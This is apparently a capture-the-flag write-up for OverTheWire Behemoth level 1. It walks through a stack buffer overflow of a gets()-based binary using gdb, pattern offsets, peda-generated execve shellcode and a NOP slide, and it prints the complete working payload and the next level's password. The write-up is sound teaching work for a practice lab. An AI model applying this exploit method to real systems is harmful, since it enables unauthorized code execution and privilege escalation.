__Behemoth :: Level 1__
================


_John Hammond_ | _Sunday, November 8th, 2015_ 


> There is no information for this level, intentionally.


----------


Start by [`ssh`][ssh]ing into the level. Supply the password you retrieved in the previous level. 

```
ssh behemoth1@behemoth.labs.overthewire.org
```


`cd` into `/behemoth/` as necessary, to see the files for this level.

`behemoth1` is what we care about. Let's run it. 

It looks very similar to level0 in that it asks us for a password. As usual, check out the program with [`ltrace`][ltrace] to see what it is doing.

```
__libc_start_main(0x804845d, 1, 0xffffd794, 0x80484a0 <unfinished ...>
printf("Password: ")                                                                                                  = 10
gets(0xffffd6ad, 0, 194, 0xf7eb85b6Password: anything
)                                                                                  = 0xffffd6ad
puts("Authentication failure.\nSorry."Authentication failure.
Sorry.
)                                                                               = 31
+++ exited (status 0) +++
```

So it looks like this doesn't even check our password or do anything with it. There's no [`strcmp`][strcmp], no nothing -- just the `puts` statement.

Notice the code _is_ however using the [`gets`][gets] function. Now, [`gets`][gets] is [notoriously](http://stackoverflow.com/questions/4346598/gets-function-in-c) [known](http://stackoverflow.com/questions/30890696/why-gets-is-deprecated) [for](https://www.reddit.com/r/learnprogramming/comments/2x4xcj/c_warning_gets_is_deprecated/) [being](http://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351) [a](http://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used) [security](https://buildsecurityin.us-cert.gov/articles/knowledge/coding-practices/fgets-and-gets_s) [vulnerability](http://c2.com/cgi/wiki?GetsIsDangerous). It does not check for the size of a [buffer](http://stackoverflow.com/questions/648309/what-does-it-mean-by-buffer) for input, so you could very easily attack the program with a [buffer overflow].

_This is exactly what we will do._

If you do not know anything about a [buffer overflow], I recommend you do a bit more [reading](https://www.owasp.org/index.php/Buffer_overflow_attack) and [research](http://arstechnica.com/security/2015/08/how-security-flaws-work-the-buffer-overflow/). There is a _ton_ of information and guides regarding buffer overflows, -- so much so it is admittedly pretty intimidating -- but if you [bang your heads against the wall][try harder] long enough and keep trying to learn and understand them, you _will_ get it. 

In a nutshell, a [buffer overflow] is _force-feeding_ so much data into the program that it chokes and throws up ([segmentation fault]). If we do this, memory in [the stack] can be overwritten, so we can actually change the return location of a function and inject our own code ([shellcode]). We could potentially tell it to run a shell, and then do whatever we want.

Starting the attack
------

First, we've got to make the program choke. You can do this by supplying a _ton_ of gibberish as input for the password, until you get a [segfault].

```
behemoth1@melinda:/behemoth$ ./behemoth1
Password: fshfhsdhdshv;sdhvjsdhv;dshvk;kjshv;jhkljwjhdslkdv'lkvjewr'kjg'srlkjfkjmfcowejmfowejqglkejelkgjeqkgjerq'gjqer'kgjreq'kgjerq'kgjqre'kgjqre'kgjqer'lkgjerq'gj'erq
Authentication failure.
Sorry.
Segmentation fault
```

But we want to actually find out _how much_ garbage we need to give it before it breaks. I found a really nice tool for this, `pattern.py` from a small "[`sploit-tools`][sploit-tools]" library, that helps out with all this. You can supply it an argument as a number of crap to generate, and you can use this to forcefeed the program.

You can create all this garbage with any arbitrary large number. If you don't get a [segfault] with the crap it gives you, use a bigger number. 

```
john@john-Latitude-E7440:~/tools$ ./pattern.py create 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

So `pattern.py` actually serves to combine two more well-known scripts `pattern_create.rb`, and `pattern_offset.rb`, apparently part of [Kali]. It's supposedly a lot faster (_25 times_ faster) than the original two, and you just choose what you want to do as an argument.

When we throw this at the program, we'll definitely get a [segfault]. Now, in order to figure out _where_ it is breaking, we'll examine it with [`gdb`][gdb]. If you know nothing about [`gdb`][gdb] or you have never heard of it before, again, I recommnd you do some [research](https://en.wikipedia.org/wiki/GNU_Debugger) and [reading][gdb tutorial].

Specify the program name as an argument, tell it to '`run`' (shorthand `r`), and give it all the garbage.

(Note that I just use the `-q` flag so it doesn't show so much initially)

```
behemoth1@melinda:/behemoth$ gdb -q ./behemoth1
Reading symbols from ./behemoth1...(no debugging symbols found)...done.
(gdb) r
Starting program: /games/behemoth/behemoth1 
Password: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x63413663 in ?? ()
```

_Enter `quit` to get out of [`gdb`][gdb]._

If you check out the output here, it shows you where the [segfault] occurs. That memory address is being overflowed and overwritten by what we pass into it; so if we give those hex values (the `63413663`, in my case) back to `pattern.py`, it can find where in the string that occurs. Check it out. 

```
john@john-Latitude-E7440:~/tools$ ./pattern.py offset 63413663
hex pattern decoded as: c6Ac
79
```

Sweet. So now we know it breaks after 79 characters in. That's all the garbage we really need to give it, anything after that can be the stuff we use to modify the code's execution.

In [the stack], immediately following those 79 characters (the entire buffer and I think the size of the stack frame), would be the memory address that the program would jump to in order to continue normal execution. It's like a `return` statement for a function; but more of a return 'location', in that the program would go to that address to continue the rest of program. 

We can overflow that memory address to anything we want. What's to stop us from changing it it to _exactly where we currently are_ and then filling a few more blocks of memory with [shellcode]?

Here, I'll show you. First, let's throw what we have so far into a file so we can [redirect][redirection] it into the program easily. We'll need to move to somewhere where we have [write permission][permissions], so I'll head to a [`/tmp/`][tmp] directory. 

```
behemoth1@melinda:/behemoth$ mkdir /tmp/cyber
behemoth1@melinda:/behemoth$ cd /tmp/cyber
behemoth1@melinda:/tmp/cyber$ python -c "print 'A'*79" > payload
behemoth1@melinda:/tmp/cyber$ cat payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

I use [Python] to quickly multiply strings, and even supply [hex] characters when the time comes. You can use the `-c` flag to just run a command as a string rather than load up the whole [interpreter].

Now if we give this file to the program inside [`gdb`][gdb], it will give us our [segfault], exactly as we expected.

```
behemoth1@melinda:/tmp/cyber$ gdb -q /behemoth/behemoth1
Reading symbols from /behemoth/behemoth1...(no debugging symbols found)...done.
(gdb) r < payload
Starting program: /games/behemoth/behemoth1 < payload
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0xf7e3da00 in __libc_start_main () from /lib32/libc.so.6
(gdb) 
```

Now if we add something more to this [payload], like some placemarkers to represent where our jumping memory address would go...

```
behemoth1@melinda:/tmp/cyber$ python -c "print 'A'*79 + 'BBBB'" > payload
behemoth1@melinda:/tmp/cyber$ gdb -q /behemoth/behemoth1
Reading symbols from /behemoth/behemoth1...(no debugging symbols found)...done.
(gdb) r < payload
Starting program: /games/behemoth/behemoth1 < payload
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Check it out! Those B's filled up to the point where the memory address would go. They are represented by that `42` [hex] value you see. 'B' is `42` in [hex]. 

Look's like we've got our [overflow][buffer overflow]. Next let's add some shellcode.

Generating shellcode
-------

So [`gdb`][gdb] actually has an extension called '[peda]', "Python Exploit Development Assistance". It has a lot of aweosme features so I recommand you read up on it and play with it, but we'll actually use it to generate our [shellcode]. 

The [`git`][git] [repo][peda] actuallu has instructions on how to install it; it's really just a set of simple commands. (It does it install it to your [home directory] by default, so feel free to change that if you'd like to).

```
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
echo "DONE! debug your program with gdb and enjoy"
```

Now when we fire up [`gdb`][gdb], you can run the commands discussed in the [repo][peda], like `shellcode`.

We can supply a `generate` argument to have it build some [shellcode] for us, and specify the target to be an `x86/linux` machine. If we want a shell, we would need to specify the type to be `exec`. It all ends up looking like this...

```
john@john-Latitude-E7440:~$ gdb
gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)
```

Boom. It gives us readily usable [shellcode]. We'll clean it up and add it to our [payload].

Before we do this, we have to add what is called a '[NOP slide]'. You can read up on this if you would like, but it essentially makes for 'padding' in memory of a bunch of bytes that don't actually do anything. '[NOP]' means '_no operation_', 'no op'. The program would see all of these, and run right through them. If we put our [shellcode] right after it, the program will _slide_ right to it. 

Here's how we would build it. `\x90` is the [hex] representation of the [NOP] instruction. You can really supply any number you'd like for the number of [NOP]s, but note that you'll have to be looking for them in [`gdb`][gdb]. 50 seems to work well for me (it makes them easy to find and pick out within [`gdb`][gdb]).

```
behemoth1@melinda:/tmp/cyber$ python -c "print 'A'*79 + 'BBBB' + '\x90'*50" > payload
```

Now when we throw this at [`gdb`][gdb], we can actually [examine] the current [stack pointer] and find where our [NOP]s put us. Since I used 50 [NOP]s and they are all displayed in sets of 4 (bytes), we really only need to see 50 / 4 = 12.5 ... round up, 13 bytes ahead of the [stack pointer], but let's go a little extra just for good measure. 

```
behemoth1@melinda:/tmp/cyber$ python -c "print 'A'*79 + 'BBBB' + '\x90'*50" > payload
behemoth1@melinda:/tmp/cyber$ gdb -q /behemoth/behemoth1
Reading symbols from /behemoth/behemoth1...(no debugging symbols found)...done.
(gdb) r < payload
Starting program: /games/behemoth/behemoth1 < payload
Password: Authentication failure.
Sorry.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) x/20x $esp
0xffffd6d0: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd6e0: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd6f0: 0x90909090  0x90909090  0x90909090  0x90909090
0xffffd700: 0x00009090  0x358a786b  0x0d939c7b  0x00000000
0xffffd710: 0x00000000  0x00000000  0x00000001  0x08048360
```

Here we see some memory, and you can see a good portion is filled with our [NOP] slide (the repetite `90`). I have the most success when I use the memory address of last line of [NOP]s (`0xffffd6f0`, at least for me).

We'll want to use this as the memory address to jump to, so it has us land right in the middle of our [NOP slide]. To do this, we have to actually supply this address in [hex], but also in [little endian].

If you've never heard of [endianness] before, [look it up](https://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Data/endian.html) as usual, but it essentially determines whether bytes are stored backwards or forwards in memory. [Big endian] is what you could consider 'normal', because the hex bytes are written in proper order ... but most machines (Intel, anyway) are [little endian]. That means the _bytes_ are reversed. 

You could reverse these easily on your own, but there's also a handy [Python] function that can do it for you. I'm just showing it you because you will likely see many people use this [`pack`][pack] function 'out in the wild'. 

You can look at [the documentation](https://docs.python.org/2/library/struct.html#struct.pack), but the first argument is essentially a string format. The '<' symbol makes it [little endian], and the 'I' specifies it is an integer. So we'd run something like...

```
>>> from struct import pack
>>> pack('<I', 0xffffd6f0)
'\xf0\xd6\xff\xff'
```

Nice and easy. Obviously change the address to whatever it happens to be on your end.

Now we'll use this instead of the placeholder we used early for the memory jump (those BBBB's), and we'll finally tack on that [shellcode] we generated earlier. Our [payload] finally ends up looking something like...

```
python -c "print 'A'*79 + '\xf0\xd6\xff\xff' + '\x90'*50 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'"> payload
```

Our [payload] is complete! If we feed it to the program outside of [`gdb`][gdb], it should execute a shell for us and let us do whatever we would like, all thanks to our [shellcode] and [buffer overflow].

Now in order to actually play with the shell (send it input and see its output), we actually have to [`cat`][cat] it out. But at the same time, we have to supply the payload file. How do we do this!?

Thanfully, you can batch or kind of combine commands within [bash] with parentheses and then semi-colons separating each command. So it essentially looks like:

```
behemoth1@melinda:/tmp/cyber$ (cat payload; cat) | /behemoth/behemoth1
Password: Authentication failure.
Sorry.

```

There is no prompt, but we've got a shell. Check it out!

```
behemoth1@melinda:/tmp/cyber$ (cat payload; cat) | /behemoth/behemoth1
Password: Authentication failure.
Sorry.
whoami
behemoth2
```

Of course you can now [`cat`][cat] the password for the next level. And we're all done!


Notes
----

If you happened to run the complete [payload] within [`gdb`][gdb], you'll notice the [shellcode] actually executes [`dash`][dash] rather than [`bash`][bash]. That's totally okay. It is still a shell, you can do what you need to, and it should always be installed by default.

On another note, __I had a really hard time trying to solve this challenge__. Until I began this writeup, I could not successfully complete a [buffer overflow]. I had been banging my head against the wall for _weeks_. I resorted to looking up some solutions to this challenge online, and I found [a](http://r4stl1n.github.io/2014/12/14/OverTheWire-Behemoth1.html) [good](http://hacktracking.blogspot.com/2013/03/behemoth-wargame-level-1.html) [amount](http://blog.techorganic.com/2015/01/21/overthewire-behemoth-writeup/), but I could not get them to work on my end. I eventually stumbled upon [a video solution](https://www.youtube.com/watch?v=6Fnvzx0xkrU), and had success.

That is the process I tried to recreate and completely _explain_ throughout this writeup. I feel as though I now understand it, and I'm pretty happy I was able to put this all together. I know this is a very _very_ long writeup, but I hoped to be as explicit and descriptive as possible with every aspect.

[Please let my turmoil be a lesson that even after banging your head against the wall for what feels like an eternity, you can eventually piece things together.][try harder]

__The password for behemoth2 is `eimahquuof`.__

[netcat]: https://en.wikipedia.org/wiki/Netcat
[Wikipedia]: https://www.wikipedia.org/
[Linux]: https://www.linux.com/
[man page]: https://en.wikipedia.org/wiki/Man_page
[PuTTY]: http://www.putty.org/
[ssh]: https://en.wikipedia.org/wiki/Secure_Shell
[Windows]: http://www.microsoft.com/en-us/windows
[virtual machine]: https://en.wikipedia.org/wiki/Virtual_machine
[operating system]:https://en.wikipedia.org/wiki/Operating_system
[OS]: https://en.wikipedia.org/wiki/Operating_system
[VMWare]: http://www.vmware.com/
[VirtualBox]: https://www.virtualbox.org/
[hostname]: https://en.wikipedia.org/wiki/Hostname
[port number]: https://en.wikipedia.org/wiki/Port_%28computer_networking%29
[distribution]:https://en.wikipedia.org/wiki/Linux_distribution
[Ubuntu]: http://www.ubuntu.com/
[ISO]: https://en.wikipedia.org/wiki/ISO_image
[standard streams]: https://en.wikipedia.org/wiki/Standard_streams
[read]: http://ss64.com/bash/read.html
[variable]: https://en.wikipedia.org/wiki/Variable_%28computer_science%29
[command substitution]: http://www.tldp.org/LDP/abs/html/commandsub.html
[permissions]: https://en.wikipedia.org/wiki/File_system_permissions
[redirection]: http://www.tldp.org/LDP/abs/html/io-redirection.html
[tmp]: http://www.tldp.org/LDP/Linux-Filesystem-Hierarchy/html/tmp.html
[curl]: http://curl.haxx.se/
[cl1p.net]: https://cl1p.net/
[request]: http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html
[POST request]: https://en.wikipedia.org/wiki/POST_%28HTTP%29
[Python]: http://python.org/
[interpreter]: https://en.wikipedia.org/wiki/List_of_command-line_interpreters
[requests]: http://docs.python-requests.org/en/latest/
[urllib]: https://docs.python.org/2/library/urllib.html
[file handling with Python]: https://docs.python.org/2/tutorial/inputoutput.html#reading-and-writing-files
[bash]: https://www.gnu.org/software/bash/
[Assembly]: https://en.wikipedia.org/wiki/Assembly_language
[the stack]:  https://en.wikipedia.org/wiki/Stack_%28abstract_data_type%29
[register]: http://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
[hex]: https://en.wikipedia.org/wiki/Hexadecimal
[archive file]: https://en.wikipedia.org/wiki/Archive_file
[zip file]: https://en.wikipedia.org/wiki/Zip_%28file_format%29
[gigabytes]: https://en.wikipedia.org/wiki/Gigabyte
[GB]: https://en.wikipedia.org/wiki/Gigabyte
[GUI]: https://en.wikipedia.org/wiki/Graphical_user_interface
[Wireshark]: https://www.wireshark.org/
[FTP]: https://en.wikipedia.org/wiki/File_Transfer_Protocol
[client and server]: https://simple.wikipedia.org/wiki/Client-server
[RETR]: http://cr.yp.to/ftp/retr.html
[FTP server]: https://help.ubuntu.com/lts/serverguide/ftp-server.html
[SFTP]: https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol
[SSL]: https://en.wikipedia.org/wiki/Transport_Layer_Security
[encryption]: https://en.wikipedia.org/wiki/Encryption
[HTML]: https://en.wikipedia.org/wiki/HTML
[Flask]: http://flask.pocoo.org/
[SQL]: https://en.wikipedia.org/wiki/SQL
[and]: https://en.wikipedia.org/wiki/Logical_conjunction
[Cyberstakes]: https://cyberstakesonline.com/
[cat]: https://en.wikipedia.org/wiki/Cat_%28Unix%29
[symbolic link]: https://en.wikipedia.org/wiki/Symbolic_link
[ln]: https://en.wikipedia.org/wiki/Ln_%28Unix%29
[absolute path]: https://en.wikipedia.org/wiki/Path_%28computing%29
[CTF]: https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security
[Cyberstakes]: https://cyberstakesonline.com/
[OverTheWire]: http://overthewire.org/
[Leviathan]: http://overthewire.org/wargames/leviathan/
[ls]: https://en.wikipedia.org/wiki/Ls
[grep]: https://en.wikipedia.org/wiki/Grep
[strings]: http://linux.die.net/man/1/strings
[ltrace]: http://linux.die.net/man/1/ltrace
[C]: https://en.wikipedia.org/wiki/C_%28programming_language%29
[strcmp]: http://linux.die.net/man/3/strcmp
[access]: http://pubs.opengroup.org/onlinepubs/009695399/functions/access.html
[system]: http://linux.die.net/man/3/system
[real user ID]: https://en.wikipedia.org/wiki/User_identifier
[effective user ID]: https://en.wikipedia.org/wiki/User_identifier
[brute force]: https://en.wikipedia.org/wiki/Brute-force_attack
[for loop]: https://en.wikipedia.org/wiki/For_loop
[bash programming]: http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
[Behemoth]: http://overthewire.org/wargames/behemoth/
[gets]: http://www.cplusplus.com/reference/cstdio/gets/
[buffer overflow]: https://en.wikipedia.org/wiki/Buffer_overflow
[try harder]: https://www.offensive-security.com/when-things-get-tough/
[segmentation fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[seg fault]: https://en.wikipedia.org/wiki/Segmentation_fault
[segfault]: https://en.wikipedia.org/wiki/Segmentation_fault
[shellcode]: https://en.wikipedia.org/wiki/Shellcode
[sploit-tools]: https://github.com/SaltwaterC/sploit-tools
[Kali]: https://www.kali.org/
[Kali Linux]: https://www.kali.org/
[gdb]: https://www.gnu.org/software/gdb/
[gdb tutorial]: http://www.unknownroad.com/rtfm/gdbtut/gdbtoc.html
[payload]: https://en.wikipedia.org/wiki/Payload_%28computing%29
[peda]: https://github.com/longld/peda
[git]: https://git-scm.com/
[home directory]: https://en.wikipedia.org/wiki/Home_directory
[NOP slide]:https://en.wikipedia.org/wiki/NOP_slide
[NOP]: https://en.wikipedia.org/wiki/NOP
[examine]: https://sourceware.org/gdb/onlinedocs/gdb/Memory.html
[stack pointer]: http://stackoverflow.com/questions/1395591/what-is-exactly-the-base-pointer-and-stack-pointer-to-what-do-they-point
[little endian]: https://en.wikipedia.org/wiki/Endianness
[big endian]: https://en.wikipedia.org/wiki/Endianness
[endianness]: https://en.wikipedia.org/wiki/Endianness
[pack]: https://docs.python.org/2/library/struct.html#struct.pack
[ash]:https://en.wikipedia.org/wiki/Almquist_shell
[dash]: https://en.wikipedia.org/wiki/Almquist_shell
